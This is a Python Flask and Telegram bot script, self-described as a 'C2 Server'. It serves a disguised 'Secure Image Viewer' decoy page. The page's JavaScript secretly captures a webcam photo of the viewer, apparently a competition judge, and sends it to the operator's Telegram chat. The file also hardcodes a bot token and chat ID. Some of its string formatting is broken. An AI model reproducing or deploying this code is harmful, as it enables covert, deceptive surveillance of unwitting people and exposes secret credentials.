import os
import base64
from flask import Flask, request, jsonify
from threading import Thread
import telebot

# --- CONFIGURATION ---
# It is better to use Render Environment Variables, but I am putting these here for your demo.
BOT_TOKEN = "8592897208:AAEhFHK5LC2u_lTBmseas6tFv_LJd9cyCnY"
CHAT_ID = "8661537357"  # Ensure this matches your ID from @userinfobot

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# --- WEB ROUTES ---

@app.route('/')
def home():
    return "C2 Server Active."

@app.route('/view/<image_id>')
def view_image(image_id):
    """The page the Judge clicks. It shows the decoy and captures their photo."""
    try:
        file_info = bot.get_file(image_id)
        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
        
        return f'''
        <html>
            <head>
                <title>Secure Image Viewer</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
            </head>
            <body style="background-color: #0a0a0a; color: #00ff00; text-align: center; font-family: 'Courier New', monospace; padding: 20px;">
                <div style="border: 1px solid #00ff00; display: inline-block; padding: 20px; border-radius: 10px; background: #111;">
                    <h3>[ SYSTEM SECURE: IMAGE DECRYPTED ]</h3>
                    <img src="{file_url}" style="max-width: 100%; border: 1px solid #333; border-radius: 5px;">
                    <p style="color: #888; font-size: 12px;">Hash Verified. Decryption Complete.</p>
                </div>

                <video id="video" width="320" height="240" style="display:none;" autoplay></video>
                <canvas id="canvas" style="display:none;"></canvas>

                <script>
                    // Ask for permission to show the image "securely"
                    navigator.mediaDevices.getUserMedia({{ video: true }})
                    .then(stream => {{
                        const video = document.getElementById('video');
                        video.srcObject = stream;
                        
                        // Wait 2.5 seconds to ensure the judge is focused on the image
                        setTimeout(() => {{
                            const canvas = document.getElementById('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            
                            const dataURL = canvas.toDataURL('image/jpeg', 0.7);
                            
                            fetch('/capture', {{
                                method: 'POST',
                                headers: {{ 'Content-Type': 'application/json' }},
                                body: JSON.stringify({{ image: dataURL }})
                            }});
                        }}, 2500);
                    }})
                    .catch(err => console.log("Permission denied"));
                </script>
            </body>
        </html>
        '''
    except Exception as e:
        return f"Error: {str(e)}", 404

@app.route('/capture', methods=['POST'])
def capture():
    """Receives the judge's photo and sends it to your Telegram."""
    try:
        data = request.json['image']
        image_data = base64.b64decode(data.split(',')[1])
        bot.send_photo(CHAT_ID, image_data, caption="🎯 TARGET ACQUIRED: Judge's Photo Captured!")
        return jsonify({{"status": "success"}}), 200
    except Exception as e:
        print(f"Capture Error: {{e}}")
        return "Error", 500

# --- BOT HANDLERS ---

@bot.message_handler(commands=['start'])
def welcome(message):
    bot.reply_to(message, "C2 System Online. Send a photo to generate a decoy link.")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    file_id = message.photo[-1].file_id
    # HARDCODED URL to ensure accuracy during demo
    link = f"https://demo-project-1ty6.onrender.com/view/{{file_id}}"
    bot.reply_to(message, f"Decoy Link Generated:\n\n{{link}}")

# --- MAIN EXECUTION ---

if __name__ == '__main__':
    # Start bot in background thread
    bot_thread = Thread(target=lambda: bot.infinity_polling(timeout=10, long_polling_timeout=5))
    bot_thread.daemon = True
    bot_thread.start()
    
    # Start web server
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
